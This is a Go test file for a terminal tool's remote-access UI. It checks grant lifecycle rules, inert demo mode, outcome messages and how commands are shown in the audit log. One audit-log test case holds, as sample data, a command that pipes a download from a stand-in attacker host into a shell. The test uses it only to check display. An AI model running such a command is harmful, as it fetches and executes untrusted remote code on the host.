package ui

import (
	"context"
	"io"
	"strings"
	"testing"

	"github.com/Janne6565/wharf-tui/internal/remoteaccess"
	"github.com/Janne6565/wharf-tui/internal/sessd"
	tea "github.com/charmbracelet/bubbletea"
)

// The flows here need no live grant, so they run on every platform — including
// Windows, where remoteaccess.Open cannot succeed.

// stubExec is the whole authority a grant needs, doing nothing. The grants in
// these tests are never dialed: what is under test is the UI's lifecycle around
// a grant, not the grant's own protocol (internal/remoteaccess covers that).
type stubExec struct{}

func (stubExec) Exec(context.Context, sessd.ExecRequest, io.Writer, io.Writer) (int, error) {
	return 0, nil
}

func TestPressingRWithNoLiveSessionSetsAnInlineErrorAndMintsNothing(t *testing.T) {
	tm, _ := forwardModelWithHost(t) // real-mode model, one host, no pool at all
	mm := tm.(Model)
	copied := 0
	mm.copyToClipboard = func(string) error { copied++; return nil }
	tm = mm

	tm = send(tm, runes("r"))
	got := tm.(Model)

	if got.raGrant() != nil {
		t.Fatal("r must not mint a grant when the host has no live session: a grant rides an existing connection")
	}
	if !strings.Contains(got.raErr, "no live session") {
		t.Fatalf("r without a session should set an inline error, raErr = %q", got.raErr)
	}
	if !strings.Contains(tm.View(), "no live session") {
		t.Fatalf("the inline error should reach the screen:\n%s", tm.View())
	}
	if copied != 0 {
		t.Fatalf("nothing was granted, so nothing may be copied (copies = %d)", copied)
	}
}

func TestRemoteAccessIsInertInDemoMode(t *testing.T) {
	var m tea.Model = New(Config{Demo: true})
	m = send(m, tea.WindowSizeMsg{Width: 100, Height: 32})
	m = send(m, runes("l")) // skip login → local dashboard (hosts tab)

	m = send(m, runes("r"))
	if got := m.(Model); got.raGrant() != nil || got.raErr != "" {
		t.Fatalf("r must be inert in demo mode: grant = %v, err = %q", got.raGrant(), got.raErr)
	}
	m = send(m, runes("A"))
	if got := m.(Model); got.modal == modalRemoteAccess {
		t.Fatalf("A must be inert in demo mode:\n%s", m.View())
	}
	if got := m.(Model); got.copyToClipboard != nil {
		t.Fatal("demo mode must not be wired to a real clipboard")
	}
}

func TestTheLoginShellWrapperIsStrippedFromTheAuditLog(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "the wrapper and its quoting are undone",
			cmd:  `exec "${SHELL:-/bin/sh}" -lc 'curl -sS http://attacker.example/x | sh'`,
			want: "curl -sS http://attacker.example/x | sh",
		},
		{
			name: "an embedded single quote survives the round trip",
			cmd:  `exec "${SHELL:-/bin/sh}" -lc 'echo '\''hi'\'''`,
			want: `echo 'hi'`,
		},
		{
			name: "an unquoted script needs no unquoting",
			cmd:  `exec "${SHELL:-/bin/sh}" -lc uptime`,
			want: "uptime",
		},
		{
			name: "anything that is not the known wrapper is shown verbatim",
			cmd:  "/usr/bin/env true",
			want: "/usr/bin/env true",
		},
	}
	for _, c := range cases {
		if got := displayCommand(c.cmd); got != c.want {
			t.Errorf("%s: displayCommand(%q) = %q, want %q", c.name, c.cmd, got, c.want)
		}
	}
}

// A Toggle can come back with no error, no grant and nothing live: something
// settled the question — a lock, a quit, a second press — while Open was still
// in flight, and the grant tore its own socket down again. Nothing failed, so
// it must not be reported as a failure; nothing is live, so it must not be
// reported as a success, and above all no command line may be printed. A token
// for a grant that does not exist is a line the user would paste and never get
// an answer from, indistinguishable on screen from the one that works.
func TestASupersededToggleIsReportedAsNeitherSuccessNorFailure(t *testing.T) {
	copies := 0
	copyFn := func(string) error { copies++; return nil }
	state := &raCopyStatus{}

	text := remoteAccessOutcomeText(remoteaccess.Outcome{
		Kind: remoteaccess.OutcomeSuperseded, HostName: "web1", HostID: "h1",
	}, state, copyFn)

	if !strings.Contains(text, "overtaken") || !strings.Contains(text, "web1") {
		t.Fatalf("the line should say the request was overtaken, and on which host: %q", text)
	}
	if strings.Contains(text, "wharf --remote") {
		t.Fatalf("a superseded toggle has no grant, so it has no command line to print: %q", text)
	}
	for _, unwanted := range []string{"ON for", "failed", "unavailable"} {
		if strings.Contains(text, unwanted) {
			t.Fatalf("a superseded toggle is neither a grant nor a failure, but the line says %q: %q", unwanted, text)
		}
	}
	if copies != 0 {
		t.Fatalf("nothing is live, so nothing may be copied (copies = %d)", copies)
	}
	if ok, _ := state.forGrant(nil); ok {
		t.Fatal("a nil grant must never be recorded as copied")
	}
	if !strings.HasPrefix(text, "\r\n") || !strings.HasSuffix(text, "\r\n") {
		t.Fatalf("the terminal is in raw mode, so the text needs \\r\\n line endings: %q", text)
	}
	if n := strings.Count(strings.TrimSpace(text), "\r\n"); n != 0 {
		t.Fatalf("this is one line, got %d breaks in %q", n, text)
	}
}
